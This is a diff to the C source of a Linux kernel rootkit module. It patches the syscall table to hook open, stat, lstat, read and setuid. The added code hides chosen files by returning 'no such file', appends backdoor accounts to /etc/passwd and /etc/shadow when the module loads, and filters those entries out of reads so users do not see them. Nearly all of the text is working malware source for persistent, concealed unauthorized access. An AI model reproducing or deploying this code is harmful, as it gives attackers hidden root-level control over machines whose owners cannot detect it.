@@ -33,28 +33,23 @@ asmlinkage long hacked_setuid(uid_t uid)
     return ret;
 }
 
-// Intercepts open to see if the user is somehow trying
-// to open a file that we are hiding.
-asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
+bool should_hide_file(const char __user *filename)
 {
-    long ret;
     char *kern_buff = NULL;
     int i;
+    bool to_hide = false;
 
-    //DEBUG("Entered HACKED OPEN");
-    
-    ret  = (*orig_open)(filename, flags, mode);
     
     kern_buff = kzalloc(strlen_user(filename)+1, GFP_KERNEL);
     if(!kern_buff)
     {
-        DEBUG("RAN OUT OF MEMORY in CAT Filter");
+        DEBUG("RAN OUT OF MEMORY in FILE FILTER");
         goto cleanup;
     }
 
     if(copy_from_user(kern_buff, filename, strlen_user(filename)))
     {   
-        DEBUG("PROBLEM COPYING FILENAME FROM USER in CAT Filter");
+        DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
         goto cleanup;
     }
     
@@ -64,8 +59,7 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
         // Hidden file is found
         if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
         {
-            // Simulate no such file existing and return -1 as the result of open
-            ret = -ENOENT;
+            to_hide = true;
             break;
         }
     }
@@ -75,6 +69,52 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
 cleanup:
     if(kern_buff)
         kfree(kern_buff);
+    return to_hide;
+}
+
+// Intercepts open to see if the user is somehow trying
+// to open a file that we are hiding.
+asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
+{
+    long ret;
+
+    ret  = (*orig_open)(filename, flags, mode);
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+
+    return ret;
+}
+
+asmlinkage long hacked_lstat(const char __user *filename,
+            struct __old_kernel_stat __user *statbuf)
+{
+    long ret;
+
+    ret = (*orig_lstat)(filename, statbuf);
+
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+
+    return ret;
+    
+}
+
+asmlinkage long hacked_stat(const char __user *filename,
+            struct __old_kernel_stat __user *statbuf)
+{
+    long ret;
+
+    ret = (*orig_stat)(filename, statbuf);
+
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+
     return ret;
 }
 
@@ -315,6 +355,7 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 	char *tmp_buf;
 	char *BACKDOOR;
 
+    //call original read
 	ret = (*orig_read)(fd, buf, count);
 
 	if(ret <= 0){
@@ -348,17 +389,19 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		goto cleanup1;
 	}
 
+    // Entry point into hiding module
 	if(strcmp(pathname, MODULE_FILE)==0){
         ret = remove_rootkit(buf, ret);
     }
     
+    //check if it's the files we want
 	if(strcmp(pathname, PASSWD_FILE)==0){
 		BACKDOOR = BACKDOOR_PASSWD;
-	}
-
-	if(strcmp(pathname, SHADOW_FILE)==0){
+	} else if(strcmp(pathname, SHADOW_FILE)==0){
 		BACKDOOR = BACKDOOR_SHADOW;		
-	}
+	} else {
+        goto cleanup1;
+    }
 
 	if(!(strstr(buf, BACKDOOR))){
 		goto cleanup1;
@@ -375,6 +418,7 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		goto cleanup2;
 	}
 
+    //remove backdoor in buf, change ret
 	while((strstr(tmp_buf, BACKDOOR))){
 		char *strBegin  = tmp_buf;
 		char *substrBegin = strstr(strBegin, BACKDOOR);
@@ -386,16 +430,118 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 
 	copy_to_user(buf, tmp_buf, ret);
 	
-	cleanup2:	
+cleanup2:	
 	if(tmp_buf) 
 		kfree(tmp_buf);
 	
-	cleanup1:
+cleanup1:
 	if(tmp) 
 		free_page((unsigned long)tmp);
 
-	exit:
-		return ret;	
+exit:
+	return ret;	
+}
+
+void add_backdoor(char * pathname)
+{
+    struct file *file;
+    char * BACKDOOR;
+    mm_segment_t old_fs;
+
+    char *buf;
+    bool has_backdoor =false;
+    int page_count = 0;
+
+    loff_t offset;
+
+    unsigned long ret;
+
+    if(strcmp(pathname, PASSWD_FILE)==0)
+        BACKDOOR = BACKDOOR_PASSWD;
+    if(strcmp(pathname, SHADOW_FILE)==0)
+        BACKDOOR = BACKDOOR_SHADOW;
+
+    old_fs = get_fs();
+
+    set_fs(get_ds());
+    file = filp_open(pathname, O_RDWR, 0);
+    set_fs(old_fs);
+
+    if(IS_ERR(file)){
+        goto exit;
+    }
+
+    //check if backdoor is already inserted
+    buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+
+    if(!buf){
+        goto cleanup1;
+    }
+
+    has_backdoor = false;
+    ret = PAGE_SIZE;
+    offset = 0;
+    while(ret == PAGE_SIZE){
+        offset = page_count*PAGE_SIZE;
+
+        set_fs(get_ds());
+        ret = vfs_read(file, buf, PAGE_SIZE, &offset);
+        set_fs(old_fs);
+
+        if(ret < 0){
+            //DEBUG("read errors");
+            goto cleanup2;
+        }
+
+        page_count++;
+
+        if(strstr(buf, BACKDOOR)){
+            has_backdoor = true;
+            break;
+        }
+    }
+
+    if(has_backdoor){
+        //DEBUG(pathname);
+        //DEBUG("-----already has backdoor-------");
+        goto cleanup2;
+    }
+
+    //DEBUG(pathname);
+    //DEBUG("--- doesn't have backdoor. inserting---");
+
+    //seek offset to end of file
+    offset = 0;
+
+    set_fs(get_ds());
+    offset = vfs_llseek(file, offset, SEEK_END);
+    set_fs(old_fs);
+
+    if(offset < 0){
+        goto cleanup2;
+    }
+
+    //add backdoor to the end of file
+    ret = 0;
+
+    set_fs(get_ds());
+    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
+    set_fs(old_fs);
+
+    if(ret<0){
+        goto cleanup2;
+    }
+
+cleanup2:
+    if(buf)
+        kfree(buf);
+
+cleanup1:
+    if(file)
+        filp_close(file, NULL);
+
+exit:
+    return;
 }
 
 void set_addr_rw(unsigned long addr)
@@ -445,9 +591,16 @@ static int __init initModule(void)
 
     set_addr_rw((unsigned long) sys_call_table);
 
+    add_backdoor(PASSWD_FILE);
+    add_backdoor(SHADOW_FILE);
+
     HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);
 
     HOOK_SYSCALL(sys_call_table, orig_open, hacked_open, __NR_open);
+
+    HOOK_SYSCALL(sys_call_table, orig_lstat, hacked_lstat, __NR_lstat);
+
+    HOOK_SYSCALL(sys_call_table, orig_stat, hacked_stat, __NR_stat);
 
     init_hide_processes();
 
@@ -467,6 +620,10 @@ static void __exit exitModule(void)
     UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);
 
     UNHOOK_SYSCALL(sys_call_table, orig_open, __NR_open);
+
+    UNHOOK_SYSCALL(sys_call_table, orig_lstat, __NR_lstat);
+
+    UNHOOK_SYSCALL(sys_call_table, orig_stat, __NR_stat);
 
     exit_hide_processes();
 
